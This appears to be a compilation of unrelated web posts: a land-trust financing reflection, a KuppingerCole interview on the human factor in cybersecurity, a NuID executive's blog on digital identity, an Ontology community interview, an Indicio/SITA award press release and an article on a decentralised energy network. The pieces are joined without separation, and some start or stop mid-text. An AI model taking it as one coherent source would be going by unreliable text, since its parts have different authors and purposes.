Moving towards longer term mission-wide funding: Carefully crafting partnerships and prototypes takes time and resources; we needed to strike a balance between allocating our capacity and ensuring that we are eventually getting paid for the work we are developing, or better developing mission-wide funding&nbsp;support.  Building financial models can be fun and visionary: Building a financial model is extremely important and fun; it forces us to look carefully at numbers, decide what connections and correlations made sense, and establish where are the gaps. Once that work is completed, we could replicate the model to other prototypes in other initiatives across our portfolio.  Recognizing the tensions behind the numbers: Much of this work hypothesises that monetizing intangible co-benefits — such as the value of heritage, wellbeing, access to nature, and so on — will drive different investment flows and result in better outcomes. Most current investment decisions are justified through quantitative analysis and therefore developing better systems for this is of significant benefit. But there are dangers in this approach: Even an evidence-based process of quantification is compromised with assumptions and can be corrupted and opaque. The numbers should support open, transparent and democratic conversations about values and trade offs — for example, do we want to give more weight to heritage or nature? There are some values which are beyond quantification e.g. The spiritual value of a tree. Furthermore financialization should be complemented by Effective and genuine participation, better regulation and reformed political systems for&nbsp;example.  Addressing uneven power dynamics between capital and community: One common thread was about here seems to be unequal power dynamics between finance and the places where some of the projects operate, and how local actors with what feels like enormous scale systems. Existing systems create certain rules and paradigms that have to shift to make it more equitable. How can we ensure that the terms of engagement be fairer (security, returns, scale,&nbsp;etc.).  Imagining land trusts beyond discounted capital: Land trusts are a powerful tool that have shown immense potential, however they generally work on the basis that somebody has to write off some or all of the price of the land at the outset. In other words, it requires discounted capital to operationalize itself, which can limit in part the scaling of the model. What we are trying to achieve in some of the emergent models we are working on is to trying to acknowledge the current value, and then create a deviation from it, in a way that can work as a more universal mechanism. How can we build that not in opposition but with or in support of the existing land trust movement around the&nbsp;world?

  <p>by <a href="https://www.kuppingercole.com/team/suess">Fabian Süß</a></p><p>Alexei Balaganski, Lead Analyst and Chief Technology Officer at KuppingerCole will discuss the Human Factor in Cybersecurity on Wednesday, November 10 from 11:00 am to 13:00 pm in the first track at <a href="https://www.kuppingercole.com/events/csls2021" title="Cybersecurity Leadership Summit 2021">Cybersecurity Leadership Summit 2021</a>.</p>
<p>To give you a sneak preview of what to expect, we asked Alexei some questions about the track.</p>
   
 What exactly is the human factor in cybersecurity after all? 
<p>Well, here we are starting with the right questions. Yeah, cybersecurity, in general, is a field where everything depends on the right definition because more often than not, we hear people talking about things which they call a certain title or name or definition or buzzword. But they talk about totally different things, right? Whether it's cloud or Zero Trust or even blockchain. It may mean different things. And the same applies to the "human factor". I would say, first of all, it's more than one thing with regard to cybersecurity. Perhaps I would try to identify at least three.</p>
<p>The most obvious one is, to err is human, everyone makes mistakes, and especially it applies to users of information technology. So it's the normal business people, not the experts. They are doing their job, they're trying to do it as securely as possible, of course, but they just have no idea how to do it properly, how to deal with all the technology. So they make mistakes. And sometimes this can lead to a massive data breach or a compliance violation. Not very often, but it can. Of course, there is a lot of bad actors out there who try to exploit this. We have a multitude of different attack vectors. The most obvious ones are social engineering, where you just get an email, which looks normal, it might even come from your CEO and you click a link and you get a malware download and you have a ransomware attack. Or it might lead to a discussion with a person that pretends to be CEO and you end up wiring all your corporate money to a hacker's account. There is a lot of possibilities to exploit. And everything depends on this human factor.</p>
<p>However, this is not the only thing we have to worry about. One other major problem is the so-called skills gap in cybersecurity. Here we are talking about experts, actual security analysts, technicians, or people who are supposed to protect those, quote-unquote, innocent businesspeople. But you just don't have enough of them. And even those who are employed, are always overworked. They have too many things to deal with, but too little time. So, yes, that's skills gap. It's been, it's existed for a decade at least, and it's only growing. And there is no simple solution on how to address it.</p>
<p>And finally, last but not least, there are people in the company who make executive decisions. These are usually not the technical people. But again, might be your CEO or some other person who decides, OK, we should spend some money and deploy a new security solution. Or perhaps we shouldn't. Or we want to switch to a totally different business platform. Maybe it's Salesforce, maybe something else. But every new business platform comes with a set of new security risks. And if those executive people make those decisions without consulting with proper security specialists like us, for example, at KuppingerCole, this might lead to massive security and compliance problems afterward as well.</p>
<p>So I would say these are three major human factor problems we have to deal with.</p>
 In thinking about the human factor in cybersecurity as you described it right now, we also have to talk about the insider threat. What strategies and probably technologies can help organizations reducing the risk from such threats? 
<p>Again, when we talk about the insider threat, we have to think about multiple different kinds of it. The most obvious one is yes, the most common one is just negligence. People make mistakes. They click the wrong button, they delete a database. Or they click a wrong link and they end up firing off a ransomware attack. Theoretically, any employee can do that. They don't have to be an expert. They don't have to have special access rights, anything can happen. How do you deal with those? Well, it's everything you do, everything you plan and deploy and operate with regards to cybersecurity that has to somehow address all those challenges.</p>
<p>The other kind of insider threat is those disgruntled and privileged employees. Maybe they just want more money. Maybe they want to work for a different company and got to steal your trade secrets. Maybe they are colluding with a hacker and they might be even being blackmailed and forced to deploy malware just to let those hackers start their attack on your company. Again, this is very difficult to deal with because more often than not, you just cannot identify what is the difference between, quote-unquote, normal people acting normally. And again, those, the same people acting maliciously. Perhaps one of the most common ways to at least detect those attacks would be something behavior-based. But you have to observe how your workers act normally, how they work, how they do their daily jobs, and then identify when something uncommon happens, an anomaly. Unfortunately, most of the tools you can get for this purpose are pretty basic in terms of yes, they can identify that something unnatural is happening, but they will struggle to explain why exactly it is unnatural. What exactly is this anomaly about and why you should kind of put all other things aside and investigate it. Solutions that can explain it, I would say they belong to the quote-unquote, next-generation security analytic solutions.</p>
 If I understand you correctly, nowadays, when we no longer recognize the classical divide between inside and outside, we should not distinguish so much the threats from inside from those from outside, is that right? 
<p>Absolutely, not just should not, you cannot anymore, because well, first of all, for many companies, there is no inside anymore. And we are now still working from home for such a long time and will probably continue doing so. So if I am talking to you now from my own home, am I inside the company or not? And of course, a firewall would never detect me doing something malicious because there is no firewall at my home. And even if there was one, it's not connected to our corporate security. So absolutely, there is no more any difference between inside and outside. You have to treat every action, every activity, every potential threat, regardless of where it's coming from.</p>
 Is this where Zero Trust as a concept or strategy comes into play? 
<p>Exactly, Zero Trust, I would say, is a theoretical concept which attempts to address all of those challenges at once. Basically, Zero Trust is the philosophy, it's the idea of how you should completely redesign your corporate network and your corporate security architecture to make sure that you can deal with any of those, quote-unquote, insider threats, whether they happen inside the company or somewhere outside. For example, at home.</p>
<p>So yes, Zero Trust is exactly the solution, but unfortunately, Zero Trust is not a magic pill, not a panacea. It's not something that you can just buy, deploy and forget about. Zero Trust is a new way to operate your business if you will. And the tools are secondary.</p>
 Looking into the future: How do you think the threats will develop in the next three to five years? Will it become more serious or will the "good side" be able to develop faster than the "bad side"? 
<p>Well, I mean, here, in the field of security, we are always on the wrong side, if you will. We will never prevail because a hacker only needs one vulnerability to break your entire system, and you have to deal with all of them at the same time. If you only missed that one, oh, you lost already. So, unfortunately, I would not be optimistic. Cyber attacks will definitely grow in scope and number and power if you will. It's becoming even cheaper than ever now to stage a cyberattack. You can even get one as a service. You only need your credit card and maybe your blockchain or Bitcoin wallet to start with one. So in that regard, no, there is no light at the end of the tunnel, if you will. But there is some hope in the new technologies and in the new approaches to design in your corporate networks.</p>
<p>You've already mentioned Zero Trust. If there is a company that starts with Zero Trust, it doesn't have any legacy network at all. I would say it will be automatically protected from perhaps 95 percent of all the common cyberattacks. So it will never be completely secure, but it will make the job of their IT teams and security teams much, much easier. If you add strong authentication, for example, into the mix, just that alone is a major booster of cybersecurity. And of course, things like security automation. So if you have this combination of modern innovative security technologies, you will be much safer than before. You will not be safe, but at least you will be protected from a lot of drive-by attacks if you will, which are not specifically targeted at you but you will never be the collateral damage in such an attack.</p>
 Do I understand you correctly? Do you think that something like Autonomous Security, which makes security smarter, for example through machine learning, will help companies rule out the human factor in some future time? 
<p>Well, it's a difficult question because, again, we are talking about a thing which many people tend to misunderstand completely. Autonomous security does not equal automated security. Autonomous does not necessarily mean that it's operated by a robot or artificial intelligence. Yes, we know that AI is a huge buzzword nowadays. And we've observed a lot of interesting developments. But we know that even now in cybersecurity, nobody trusts AI to make security decisions. Simply because there is a lot at stake and a wrong decision can ruin your business completely, especially if it's something like manufacturing or high-speed financial trading. So people tend to mistrust AI.</p>
<p>And when we're talking about properly autonomous security, it's probably still managed by a team of security experts. But the team doesn't have to work for you. It might be just the managed service, a multi-tenant managed service even, so someone who's operating your security for you as a service from a remote location. But they are still kind of much closer to your infrastructure and your pain points and bottlenecks to quickly identify any attack. But again, there will still be a human, in the end, making a decision. But your goal is to make sure that that human is the best one, the smartest one, and the one supported by the best tools. So a robot will never replace a human in that regard. But they will help.</p>
 Do you think "never" is a word to be used in that context? 
<p>Well, I dread the times where robots will make all the decisions for us. I think they will be more like Skynet than benevolent...</p>

<p>Last week I wrapped up my first quarter here at NuID, which is also my first 90 days as <a href="https://nuid.io/about.html">COO</a> of the company since I started on July 1st.</p><p>Prior to July 1st it had been 20 years since the last time I formally “resigned” from one company and “joined” a completely different one. &nbsp;I have certainly started many new jobs, projects, roles, and relationships along the way, but this one has been a bit different. &nbsp;Reflecting on it now, the difference is that in the SAP/Ariba/Procurement technology world, my reputation—my identity—was always known even though the responsibility and team may change.</p><p>1998 was my first year as a professional consultant, and during an early performance feedback session my manager said to me something along the lines of, “you can only see into the future twice as far as you’ve come... &nbsp;you’ve only been on the job for 6 months; what do you want to be doing in a year?.” &nbsp;It stuck with me as a truth, I believe it was <a href="https://www.linkedin.com/in/dbarron/">David Barron</a> that told me that.</p><p>Sometime between 2013 and 2016 I had come far enough in my career and had enough Gladwell-esque sampling under my belt that certain other truths about my values had become quite clear to me. I realized that the teams I had been building, and that had built me, held these common truths as well.</p><p>Things like trust and loyalty are important to me, and I say that because I feel physically uncomfortable if lost, not because they are abstract concepts I’ve merely decided to abide by; they are things that I just am, just feel. &nbsp;Things also like accountability, follow-through, challenging the status-quo.</p><p>Things like learning to not mistake kindness for weakness and developing the experience to teach it as a lesson if I’m mistaken for weak. &nbsp;Things like at the end of the day, I can only work with people that I genuinely like and enjoy, because I can’t be successful if I’m not having a lot of fun while doing it.</p><p>I’ve also shared many times in coaching sessions, and have illustrated in my career that “the best way to get your next job is to be great at the job you have,” not to always be looking for your next move. &nbsp;The process of how I got to the decision to leave SAP-Ariba—and my family of 2,000 of the most amazing people to be found in eProcurement—is one that I’ve been very thoughtful about.</p><p>Starting sometime around the holidays of last year, my mind emotionally started to wander about “what’s, really next?”. &nbsp;I was having instincts I trust begin telling me to think about the next 20 years of my career.</p><p>As I pondered that question over several months, a few things I was able to determine were that:</p>
 
 
<p>I felt the end of the first half of my career was coming</p>
 
 
<p>I was not going to leave SAP to do SAP, or Procurement software elsewhere</p>
 
 
<p>Application verticals are not where I want to be</p>
 
 
<p>Platforms, hyperscalers, low-code/no-code, P2P, and distributed Web3 technologies is where the tip of the spear is</p>
 
 
<p>Identity management is a big internet problem, it’s a separate and common problem across all of these enablers for the Web of the future. And THAT, I’m interested in most indeed!</p>
 
 
<p>I was feeling a draw towards what I was calling Identity Management at the time and began looking into Enterprise Identity SaaS providers</p>
 
 
<blockquote>
<p>Side note – it’s probably not coincidence that <a href="https://www.linkedin.com/in/jason-wolf-ismatsap/">Jason Wolf</a> resigned less than a month before I did to become Ping Identities Chief Revenue Officer.  Jason and I “grew up” together at Ariba and SAP after both graduating from Texas A&amp;M.  We spoke often, including about careers, but neither of us told the other where we were going, or asked.  I learned from Jason’s LinkedIn announcement, chuckled, and was not surprised.</p>
</blockquote>
<p>In December and January, I had paid $1,700 to have a professional writer begin compiling some form of a resume for me. &nbsp;I truly did not have one for over 15 years; I needed only to rely on my identity and my reputation. &nbsp;Since I sensed a different kind of change was coming for me, I felt I needed serious resume help, and yet that resume was never used for the same reason I hadn't needed one in the 15 years prior.</p><p>In late March I was walking back from my mailbox while simultaneously texting with my aunt, Sarah. &nbsp;Sarah randomly told me of a company that she had invested in that I should look into called NuID (“(New Id)” she included, so I didn’t think it was pronounced “Noooooid”).</p><p>It made me stop walking, stand still, and google NuID. &nbsp;A few minutes later, still standing there with mail tucked under my arm, I replied “Well Sarah, personally I am looking to invest in and join a group in identity management specifically, or platforms in general. &nbsp;I like what NuID is doing, that is the type of group I want to join and lead to grow, good stuff right there!”</p><p>Within 48 hours I had spoken to my cousin and arranged for him to introduce me to Locke. &nbsp;My entire family made a weekend trip to Birmingham to visit family, and to meet with Locke for 6 hours straight on Saturday and again at brunch on Sunday. &nbsp;For the next two months, I, and NuID, did as much due-diligence as we could, and then I joined the team.</p><p>That we know, but I’ve been thinking about it in terms of Relationships, Identity, Credentials, Verification, and Reputation – a big Web2.0 problem, without a real solution prior to NuID for a while now so I want to play back that very natural, organic vetting and transacting that occurred between NuID and I with a bit more simplicity, and specificity, to ultimately help illuminate the mechanics of identity as they play out in the real world.</p>SAP ID #835427 
 
<p>I was an SAP employee from 2012 to 2021 and as such, I possessed a Verified Credential with SAP ID # 835427.</p>
 
 
<p>Over those years I developed a strong Reputation within the Ariba and SAP community and progressed through my career, which is easily verified on LinkedIn, or by talking to my team.</p>
 
 
<p>In late March I was walking back from the mailbox when I got a random text from my aunt Sarah that “she had a thought”.  Sarah had invested in a company called NuID that she thought I would be very interested in.</p>
 
 
<p>Sarah learned of NuID because she saw Locke Brown grow up, since Locke and her son went to junior-high and high school together she personally knew Locke.</p>
 
 
<p>Sarah isn’t a technologist, far from it actually, but she is a successful doctor and businesswoman.  So, it wasn’t a keen eye toward SSID, it was her son’s attestation of NuID’s Credentials, and her personal experience with Locke’s reputation that gave her confidence to invest.</p>
 
 
<p>Similarly, Sarah verifying Locke’s Credentials with me, gave me the attestation I needed begin digging into NuID, intensely.</p>
 
 
<p>Locke, as human nature is, essentially got attestations from my cousin and aunt that I am indeed, Jason Jablecki and that I have the Credentials necessary. So we met via a personal email introduction from my cousin.</p>
 
 
<p>As June 30th turned to July 1st, I turned in my SAP employee credential and was granted my NuID employee credential</p>
 
 
<p>You see… Identity is the fact of being who or what a person or thing is, and Authentication is how we know that the Identity is indeed, The Fact. &nbsp;Once we have authenticated the factual-identity of a person, place, thing, device, anything, and we trust its verified credentials, it can exchange digital assets or participate trustlessly in any peer-to-peer digital, and digitally enabled physical interaction.</p><p>After Authentication, it is really the composite of an identity’s qualification, achievement, personal quality, or aspect of a person's background that make up how we tend to think of identity, or reputation of a person day to day.</p><p>Credentials are elemental to Identity, and we know this instinctively as humans.</p> 
 
<p>Go shopping and present debit card as a credential that authorizes financial settlement for the exchange of assets.</p>
 
 
<p>Travel using CLEAR and your biometric credential authorizes an agent to escort you more quickly through TSA.</p>
 
 
<p>Our verifiable identities are elemental to our interactions, our transactions, our possession, therefore, authentication is elemental for identities.</p><p>So once again, let’s play my story out, this time through the self-sovereign identity layer of Web3.0, by using the backwards compatible Web2.0-bridging NuID Authentication Protocol.</p><blockquote>Safe harbor: this is an imaginary, futuristic scenario that did not take place, and even though all of it is possible with the NuID elements available today, none of the parties are real</blockquote> 
 
<p>I was a NuSAP employee through June of this year.  NuSAP had implemented the NuID Authentication Protocol element in Q1 and deleted all employee passwords, so my verified NuID was created at that time and SAP attested my Employment Credential to it.</p>
 
 
<p>During my time with NuSAP I developed a strong reputation, held many different positions, got certifications, and titles, all of which was attested as credentials to my Identity by NuSAP and other third parties.</p>
 
 
<p>In late March of this year I was walking back from the mailbox, simultaneously texting with my aunt, who told me of NuID, and that NuID is looking for a COO.</p>
 
 
<p>My aunt connected me to Locke Brown, with whom I shared relevant aspects of my Nu Identity, which now has quite a reputation given all of the “credentials” I’ve acquired.</p>
 
 
<p>NuSAP’s automated offboarding process ran on June 30th, removing my employee credential from my NuID, and NuID Inc. attested my Nu Employee Credential.</p>
 
 
<p>Thinking through identity process and applications of the NuID protocol is something I’ve been doing a lot of lately while we’re not working on the Kii launch, our Q2 consumer product release, and talking to enterprise and partner prospects. &nbsp;I’ll close this, my first NuID blog, by sharing a whiteboard that I did last week with the team, which is referred to as, the comic book:</p><p>Look out for more blogs, comics, and content from the NuID team and for exciting news to come as we execute on our roadmap toward a sovereign identity ecosystem.</p><p>—Jason</p>

How did you hear about Ontology? What drew your attention to Ontology? <p>I discovered Ontology for the first time on CoinMarketCap in January, 2018. I liked the name Ontology, so I did some research.</p> 2. Why did you become a supporter of Ontology and a champion of its&nbsp;brand? <p>I became a supporter as I saw very little activity in the Ontology Turkish group. So I asked if I could be a part-time supporter and help strengthen the group, and now I am a big supporter. My group is much more active, and we also have a Free Technical Analysis Signals&nbsp;group.</p> 3. What’s the key role of a Harbinger? What’s your favorite thing about being a Harbinger? <p>I want to strengthen the team and grow the community.</p> 4. Why is it important to you to be a part of the Ontology community? <p>I want to follow up on the latest news from Ontology and share the news and ideas within our Ontology community.</p> 5. How is the Ontology community different from other blockchain communities, is there anything that makes it stand&nbsp;out? <p><a href="https://medium.com/ontologynetwork/learn-what-it-takes-to-become-the-next-ontology-harbinger-8c55c49dc856">The Harbinger program</a> is not available in other blockchains or other communities. I have not seen it or heard of anyone else doing a similar&nbsp;program.</p> 6. What do you use as your main channels for interacting with the Ontology community and why? Do you want to see&nbsp;more? <p>Twitter and Telegram for now, but maybe Instagram in the&nbsp;future.</p> 7. Can you share an unforgettable experience or something you learned from being a Harbinger? What advice would you give to someone who wants to be a journalist? <p>My advice would be to stay active in the project. Supporting the project as much as you can, helping them to build the future, and sharing your knowledge with&nbsp;others.</p> 8. How would you describe the Ontology community in three&nbsp;words? <p>Active, Quality, Technology.</p> 9. How do you think Ontology can expand its community going forward? What would you like to see more/less? What kinds of things do you see community members doing that you think have helped our community grow? <p>Hosting AMAs each week in other Telegram groups with other public chains, or by inviting them and mingling with them and organizing activities together.</p> 10. What do you see as key milestones for Ontology and how can the community help achieve&nbsp;them? <p>Now Ontology is 3 years old and I hope to see more collaborations with other companies or public chains, to let the world know how wonderful Ontology&nbsp;is.</p><p>To learn more about Ontology’s Harbinger Program and how you can get involved, check out our updated&nbsp;<a href="https://medium.com/ontologynetwork/learn-what-it-takes-to-become-the-next-ontology-harbinger-8c55c49dc856">GUIDE</a>.</p> Want more Ontology? <p>Learn more about our decentralized data and identity solutions on our <a href="https://ont.io/">website</a> and official <a href="https://twitter.com/OntologyNetwork">Twitter</a> account. You can also chat with us on <a href="https://t.me/OntologyNetwork">Telegram</a> and keep up-to-date with the latest news via our <a href="https://t.me/OntologyAnnouncements">Telegram Announcement</a> account.</p> <p><a href="https://medium.com/ontologynetwork/ontology-harbinger-interview-series-solot%C3%BCrk-c3ca08587e30">Ontology Harbinger Interview Series: SoloTürk</a> was originally published in <a href="https://medium.com/ontologynetwork">OntologyNetwork</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>

				  Decentralized identity solution developer and air transport technology provider nominated for Blockchain Services Award in the Tools &amp; Middleware category  
			  
				
				
				 <p>SEATTLE — October 06, 2021 — <a href="https://indicio.tech/">Indicio</a>, the world’s leading provider of decentralized identity development and hosting solutions and <a href="https://www.sita.aero/">SITA</a>, the leading provider of IT to the air transport industry, today announced they were finalists in the Blockchain Services Award: Tools &amp; Middleware category in the <a href="https://blockchainrevolutionglobal.com/the-eb-awards/">Enterprise Blockchain Awards</a> (EBAs) presented by the <a href="https://www.blockchainresearchinstitute.org/enterprise-blockchain-awards/">Blockchain Research Institute.</a> The partnership was recognized for their work on the <a href="https://www.sita.aero/resources/videos/happy-traveler-card/">Aruba Secure Health Card</a>, a successful pilot&nbsp; for sharing health information in a privacy-preserving way using distributed ledger technology that debuted earlier in the year with the assistance of the Aruba Health Department.</p>
<p>“Indicio is proud to be a finalist for this award, which recognizes the power of blockchain-based technology to create a world in which the ability to trust data is possible — thank you BRI and EBA,” said Heather Dahl, CEO of Indicio. “I also want to also thank our partner in this project,&nbsp; SITA, for its vision and leadership in the air travel industry, and for seeing how this technology can change the way we travel and deliver so many benefits to passengers in the future.”</p>
<p>A distributed blockchain-based ledger is at the foundation of Indicio and SITA’s project. It serves as an anchor for verifiable digital credentials that enable people to hold, share and prove important information in a way that preserves privacy and improves security.</p>
<p>“For the Aruba Secure Health Card, we wanted travelers to Aruba to share proof that they had tested negative for COVID as they visited hotels and restaurants on the island,” said Dahl. “Our goal was to have travelers share their status in a way that didn’t require sharing any personal identifying information with the businesses they visited—or require those businesses to record any personal information. We call this a Trusted Data Ecosystem. It’s where information can be shared and verified in a secure, privacy-preserving way and without the need for third parties to be involved in the flow, management, or storage of that information. Removing third parties is&nbsp; vital to both data privacy compliance and to implementing a Zero-Trust approach to security. Trusted Data Ecosystems are our solution to the problem of trust online.</p>
<p>New this year, the Blockchain Service Award category celebrates providers of blockchain technologies and services. It recognizes companies, government agencies, or nongovernmental entities delivering blockchain solutions to transform their clients’ operations, supply chains, or ecosystems. This category offers an opportunity to showcase the tangible and long-term change that blockchain service providers are working to support.</p>

<p>Forty-nine degrees Celsius outside. Suddenly, the climate crisis felt pretty real.</p><p>As I started writing this article back in June, sweltering in my home office, western North America was in the grip of a <a href="https://www.cbsnews.com/news/heat-wave-dome-2021-seattle-portland-weather/">bizarre and unusual</a> heat wave. One town a few hours west of me <a href="https://www.nytimes.com/2021/06/30/world/canada/bc-canada-heat-wave.html">broke the all-time Canadian record</a> at 49.6°C (121°F), and was <a href="https://www.msn.com/en-us/news/us/e2-80-98our-poor-little-town-of-lytton-is-gone-e2-80-99-village-at-center-of-canada-e2-80-99s-heatwave-devastated-by-e2-80-98catastrophic-e2-80-99-fires/ar-AALFvbd">incinerated in a wildfire</a> later that week.</p><p>The last decade has seen more than its share of wildfires up and down the west coast; some years I’ve forgotten what it was like to breathe clear air and see the stars. Meanwhile, Germany, Belgium, and the southwest US were drenched in <a href="https://www.msn.com/en-us/news/world/europe-flooding-record-rainfall-leaves-over-120-dead-in-western-europe-devastating-parts-of-germany/ar-AAMdTGY">catastrophic floodwaters</a>.</p><p>This isn’t normal.</p><p>I usually have to experience something myself in order to really appreciate it. It takes me from “of course I care, in an abstract way” to “holy cow, we’ve got to do something about this.” I expect a lot of us work that way.</p> So what can we do? <p>I’m not sure. But one thing I do know is that we have enough science to diagnose the problem and solve it. On the front end, we need to <a href="https://350.org/science/">stop releasing greenhouse gases</a> into the atmosphere; on the back end, we need to <a href="https://www.bbc.com/future/article/20130226-amazon-lungs-of-the-planet">stop damaging our planet’s lungs</a>. We can <a href="https://www.permaculturenews.org/2016/06/29/john-d-liu-interview-possible-rehabilitate-large-scale-damaged-ecosystems/">rapidly repair and even enhance</a> our planet’s capacity to support life with the tools we already have available. And if we do it right, we could even <a href="https://www.chelseagreen.com/product/farming-while-black/">rebalance inequity</a> and improve the <a href="https://www.csuchico.edu/regenerativeagriculture/blog/nutrient-density.shtml">quality of our food</a> in the process.</p><p>What we don’t know is how to coordinate our efforts — all 7.9 billion of us, and counting — to reach these goals. In a recent interview, thinker and futurist <a href="https://www.humanetech.com/podcast/a-problem-well-stated-is-half-solved">Daniel Schmachtenberger argues</a> that <a href="https://consilienceproject.org/about/">if we can</a> solve this problem, all the other problems will get solved automatically.</p> Energy, one piece of the pie <p>All the brightest and darkest things in our modern civilisation come from our capacity to harness the energies of the universe. And right now most of those energies come as fossil fuels — coal, petroleum, and natural gas. <a href="https://ourworldindata.org/emissions-by-sector">Almost three quarters</a> of the greenhouse gases we emit come from energy production. That’s because <a href="https://ourworldindata.org/energy-mix#energy-mix-what-sources-do-we-get-our-energy-from">82% of that energy</a> comes from fossil fuels. And we’re using <a href="https://ourworldindata.org/grapher/global-primary-energy">more and more energy each year</a>.</p>Of humanity's greenhouse gas emissions, 73% comes from energy consumption – electricity, heating, transportation, and industry. The energy we consume comes primarily from fossil fuels, while only 18% comes from renewables and nuclear power. (Note: because of rounding errors, the percentages in this graphic don't quite add up to 100%.)<p>This tells me two things: we need to learn how to use less energy, and the energy we do use must come from low-carbon sources. As far as we know, that means we need to <a href="https://ourworldindata.org/electricity-mix#electricity-is-only-one-part-of-total-energy-decarbonizing-electricity-is-only-one-step-towards-a-low-carbon-energy-system">electrify</a> <a href="https://www.weforum.org/agenda/2020/04/can-electricity-decarbonize-the-energy-sector/">everything</a>.</p><p>But low-carbon electricity carries a new set of coordination problems.</p><p>First, most renewables are <a href="https://en.wikipedia.org/wiki/Duck_curve">not well-matched with demand</a>. Let’s take a look at solar electricity. When we start brewing our morning tea, the sun is still rising. Then there’s a sort of peak production — too much power in the grid — in the middle of the day when we’re off at work. In the evening, just when we’re cooking supper, the sun is already going to bed. It won’t do us any good to switch to renewable electricity if it’s not actually there when we need it.</p>A graph taken from a typical October day in a California power utility shows a steep rise in solar electricity generation from 08:00, which begins to fall at 15:00 and is virtually non-existent at 18:00. Combined with high demand in the morning and evening, this creates a 'duck curve'.<p>Second, power producers and distributors build their infrastructure to meet peak demand, not average demand. If we electrify everything, that would mean more drastic peaks, which would mean more power plants and fatter wires. And every tonne of concrete and steel, every kilometre of copper wire, every wind turbine, every hectare of solar panels, is the product of <a href="https://en.wikipedia.org/wiki/Life-cycle_greenhouse_gas_emissions_of_energy_sources">carbon-intensive manufacturing processes</a>.</p><p>Third, consumers are also becoming producers, and it’s happening quickly. <a href="https://www.energymagazine.com.au/energy-disruption-is-here-but-not-as-we-expected/">Over a fifth of Australian homes</a> have rooftop solar panels, and <a href="https://www.forbes.com/sites/jamesellsmoor/2019/07/17/mini-grids-are-ready-to-change-the-world-again/?sh=680624eca164">minigrids</a> and <a href="https://en.wikipedia.org/wiki/Community_solar_farm">community solar gardens</a> are on the rise. Distributed energy production is already here. That’s wonderful, but the grid is designed for one-way delivery of electricity generated by large plants whose output is easy to predict.</p><p>Our infrastructure <a href="http://www.mefco2.eu/news/decarbonization-digitalisation-decentralisation-energy-sector.php">isn’t prepared</a> to handle these challenges. It’s big and unwieldy. Teaching it to respond to these new demands would be like teaching a team of oxen to fly like a flock of starlings.</p><p>But starlings are exactly what we need. Many small energy producers and consumers, responding nimbly to each other, moment by moment. Analysts tell us that the most reasonable way to do this is to <a href="https://www.caf.com/en/knowledge/views/2019/11/the-3-ds-of-energy-decarbonization-digitization-and-decentralization/">decentralise and digitalise</a> the grid as we decarbonise.</p><p>Coordination is necessary, but it appears exceedingly difficult at the same time.</p><p>Given the risks we face, this is sobering.</p><p>Fortunately, there are people working on these challenges already. I’d like to introduce you to one such group of visionaries.</p> The Internet of Energy Network: teaching toasters to fly <p>In 2018, Dr Adam Bumpus, Alex Evans, and Sim Wilson came together with a desire to tackle the challenges of energy coordination. If they could figure this out, they knew they could help the world move toward a <a href="https://whatsyour2040.com/">brighter future</a>.</p><p>One of their first questions was, “what if we could build coordination capacities into the things that already exist?” I appreciate their choice to ground high ideals in reality. Instead of pushing the grid to change, they started at the bottom with individual devices in homes and businesses.</p><p>The trio called themselves RedGrid, assembling a team to help them imagine ways to get all these devices talking to each other. They asked what would happen if they were to connect together into ‘virtual microgrids’ and eventually into a global ‘software-defined grid’ giving intelligence to the existing physical grid. Production and storage devices, side by side with our air conditioners and fridges and ovens, making decisions together in response to changes in supply and demand. Just like a flock of starlings.</p><p>Mike Gamble, the company’s lead architect, describes this approach as “grassroots, bottom-up, organic.” Anyone who wants to join the flock is welcome.</p><p>As they built out this vision, they called it the <a href="https://www.ioen.tech/">Internet of Energy Network</a> (I’ll call it IOEN, pronounced “ion”, for short). Given what I learned about the inflexibility of the current energy grid, this approach makes a lot of sense. It won’t require everything to change at once, which means that it has a chance of actually working. Regardless of how many people and organisations end up getting involved, something meaningful can happen at every scale. As more layers are added, the benefits start compounding.</p><p>And it happens to mesh nicely with the greenest, least complicated carbon reduction technique: just use less energy.</p><p>Even without taking advantage of the IOEN, RedGrid has an app that <a href="https://redgrid.io/for-households/">talks to smart appliances</a> (and not-so-smart appliances using smart plugs). At its most basic, it helps people monitor their energy consumption; this alone has been <a href="https://link.springer.com/article/10.1007/s12053-019-09777-z">shown to reduce people’s consumption patterns</a>.</p><p>It also allows people to schedule energy-hungry appliances, like their dishwasher, in the <a href="https://youtu.be/O-lv-3AeIms">middle of the day</a> when green energy is plentiful. This doesn’t reduce consumption by itself, but it can help them green the energy they do consume, or get better rates and even rebates by taking advantage of their energy company’s <a href="https://en.wikipedia.org/wiki/Demand_response">demand response</a> incentives. This doesn’t just save people money and make them feel good; it also prevents more infrastructure from being built. Remember that power companies build to meet peak demand — if we can flatten the peaks, the grid can be leaner.</p><p>Their software can also use machine learning to help long-running machines, such as air conditioners and pool pumps, use less power without sacrificing comfort.</p><p>If everyone added this sort of smarts to their individual energy use, we’d likely see both consumption and peak demand start to drop across the world. It’d help — to an extent. But the RedGrid team thinks that the real reductions will happen when these devices can break through the four walls around them and start talking to their neighbours.</p><p>Devices in the IOEN will be able to emit signals for other devices to respond to. At noon the community solar farm could say “we’re flooded with energy right now; can anyone use it?” Hundreds of dishwashers and car chargers, waiting for just such a signal, would turn on in response. Or in the evening the utility could say “we’re getting stressed; could everyone go easy for a while?” and air conditioners, pool pumps, and <a href="https://www.solarquotes.com.au/blog/hot-water-vpp-mb1870/">water heaters</a> would scale back.</p><p>It gets more interesting when devices, and the people who own them, can talk directly to each other. Rather than overwhelming the community solar farm all at once, all those dishwashers could arrange to take turns. Or, if someone knows they’re going to be using a lot more electricity than usual — maybe they’re cooking for a big birthday party — they could let their neighbours know. People like being neighbourly, so they’re likely to make accommodations for that. Mike suggested that it could even spur a bit of friendly competition among virtual microgrids, an energy-saving drive: “You may have a group that is your sports team, and you are aiming to do better energy-wise against another team.”</p><p>And with the increase in local generation and storage — rooftop solar and electric car batteries — energy consumers could also be providers, selling their surplus to their neighbours. Local generation reduces the burden on infrastructure even further and makes everyone more resilient to power outages.</p><p>The IOEN is simply the communication layer that makes all this possible; the real magic happens in the applications built on top of it. RedGrid sees more opportunities on the horizon.</p>  Virtual microgrids can aggressively optimise their energy use, offer their combined optimisations as a package to energy companies, and distribute the rebates to members.  Physical microgrids such as Monash University’s <a href="https://www.monash.edu/net-zero-initiative">Net Zero</a> project (<a href="https://www.afr.com/technology/the-tech-firm-overhauling-energy-by-creating-mini-grids-driven-by-ai-20190627-p521xi">partnering</a> with RedGrid) can build smaller systems if they can rely on the IOEN to help smooth out demand peaks.  